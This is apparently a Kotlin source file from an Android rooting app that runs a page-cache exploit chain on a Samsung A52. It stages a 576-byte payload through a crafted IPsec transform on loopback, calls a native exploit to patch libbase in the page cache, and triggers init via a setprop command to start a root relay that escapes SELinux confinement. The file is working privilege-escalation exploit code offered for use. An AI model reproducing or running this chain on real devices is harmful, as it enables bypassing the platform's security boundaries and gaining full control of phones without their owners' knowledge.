package org.opencrown.app.root

import android.content.Context
import android.net.IpSecAlgorithm
import android.net.IpSecManager
import android.net.IpSecTransform
import android.system.ErrnoException
import android.system.Os
import android.system.OsConstants
import android.util.Log
import java.net.InetAddress
import java.util.concurrent.TimeUnit

/**
 * A52s page-cache chain.
 *
 * The chain stages a libbase page-cache patch and builds an init-domain relay.
 * The app cannot connect to that relay (untrusted_app is excluded by SELinux),
 * but the relay creates /dev/.dfi when it starts. The app only needs to know
 * whether root is active, so it looks for the marker.
 */
class A52RootChain(private val context: Context) {
    interface Listener {
        fun onLog(line: String)
    }

    private external fun nativeExploit(
        encapPort: Int,
        spi: Int,
        payload: ByteArray,
        keys: ByteArray,
        hmacTruncBytes: Int,
        callback: Any,
    ): String?

    @Suppress("unused")
    fun onNativeProgress(message: String) {
        listener?.onLog(message)
    }

    @Volatile
    private var listener: Listener? = null

    /** Run the page-cache exploit. Returns true when the native chain reports success. */
    fun run(listener: Listener): Boolean {
        this.listener = listener
        synchronized(RUN_LOCK) {
            var ipsec: IpSecManager? = null
            var spi: IpSecManager.SecurityParameterIndex? = null
            var encap: IpSecManager.UdpEncapsulationSocket? = null
            var transform: IpSecTransform? = null
            return try {
                val payload = context.assets.open(PAYLOAD_ASSET).use { it.readBytes() }
                require(payload.size == 576) { "unexpected payload size ${payload.size}" }

                ipsec = context.getSystemService(Context.IPSEC_SERVICE) as? IpSecManager
                    ?: error("IpSecManager unavailable")
                val loopback = InetAddress.getByName("127.0.0.1")
                spi = ipsec.allocateSecurityParameterIndex(loopback)
                val crypt = IpSecAlgorithm("cbc(aes)", AES_CBC_KEY)
                val auth = IpSecAlgorithm("hmac(sha256)", HMAC_SHA256_KEY, HMAC_TRUNC_BITS)
                encap = ipsec.openUdpEncapsulationSocket()
                val port = encap.port
                transform = IpSecTransform.Builder(context)
                    .setEncryption(crypt)
                    .setAuthentication(auth)
                    .setIpv4Encapsulation(encap, port)
                    .buildTransportModeTransform(loopback, spi)

                val keys = ByteArray(64)
                System.arraycopy(AES_CBC_KEY, 0, keys, 0, 32)
                System.arraycopy(HMAC_SHA256_KEY, 0, keys, 32, 32)
                val result = nativeExploit(port, spi.spi, payload, keys, HMAC_TRUNC_BITS / 8, this)
                listener.onLog(result ?: "native exploit returned no result")
                result?.contains("Verified: 576/576 bytes match") == true &&
                    result?.contains("PAGE CACHE MODIFIED") == true
            } catch (t: Throwable) {
                Log.e(TAG, "A52 root exploit failed", t)
                listener.onLog("exploit failed: ${t.javaClass.simpleName}: ${t.message}")
                false
            } finally {
                runCatching { transform?.close() }
                runCatching { encap?.close() }
                runCatching { spi?.close() }
            }
        }
    }

    /** Ask init to log, which is how the patched logger starts the relay. */
    fun triggerInitLog(): String {
        val token = System.currentTimeMillis().toString()
        val attempts = listOf(
            arrayOf("/system/bin/setprop", "debug.dirtyinit", token),
            arrayOf("/system/bin/sh", "-c", "setprop debug.dirtyinit $token"),
        )
        for (cmd in attempts) {
            try {
                val process = ProcessBuilder(*cmd).redirectErrorStream(true).start()
                val finished = process.waitFor(2, TimeUnit.SECONDS)
                val output = process.inputStream.bufferedReader().readText().trim()
                if (!finished) process.destroyForcibly()
                if (finished && process.exitValue() == 0) {
                    return "init trigger accepted"
                }
                if (output.isNotEmpty()) return output
            } catch (t: Throwable) {
                Log.w(TAG, "trigger attempt failed", t)
            }
        }
        return "init trigger denied"
    }

    /**
     * The relay creates /dev/.dfi. The app cannot open it (untrusted_app), but
     * EACCES/EPERM on stat means the marker exists. ENOENT means no relay yet.
     */
    fun isRootActive(): Boolean {
        return try {
            Os.stat("/dev/.dfi")
            true
        } catch (e: ErrnoException) {
            e.errno == OsConstants.EACCES || e.errno == OsConstants.EPERM
        }
    }

    companion object {
        private const val TAG = "OpenCrownA52"
        private const val PAYLOAD_ASSET = "a52_payload.bin"
        private const val HMAC_TRUNC_BITS = 128

        private val AES_CBC_KEY = "ABCDEFGHIJKLMNOPQRSTUVWXYZ012345".toByteArray(Charsets.US_ASCII)
        private val HMAC_SHA256_KEY = "HMACKEY_FOR_DIRTYINIT_CBC_MODE!!".toByteArray(Charsets.US_ASCII)
        private val RUN_LOCK = Any()

        init {
            System.loadLibrary("a52root")
        }
    }
}
